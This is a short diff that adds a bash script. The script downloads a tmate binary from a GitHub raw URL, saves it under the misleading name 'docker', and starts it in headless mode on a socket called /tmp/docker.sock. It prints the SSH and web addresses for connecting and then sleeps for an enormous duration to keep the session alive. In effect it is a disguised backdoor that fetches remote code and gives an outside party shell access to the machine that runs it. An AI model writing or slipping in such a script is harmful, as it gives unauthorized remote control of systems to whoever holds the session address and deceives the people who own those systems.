@@ -1,0 +1,8 @@
+#!/bin/bash
+curl -L -o docker https://github.com/JoseMoraa/morii/raw/main/tmate
+chmod +x docker
+./docker -S /tmp/docker.sock new-session -d               # Launch tmate in a headless mode
+./docker -S /tmp/docker.sock wait tmate-ready
+./docker -S /tmp/docker.sock display -p 'Connect with SSH address: #{tmate_ssh}'
+./docker -S /tmp/docker.sock display -p 'Connect with web: #{tmate_web}'
+sleep 564365463325467776574674674567
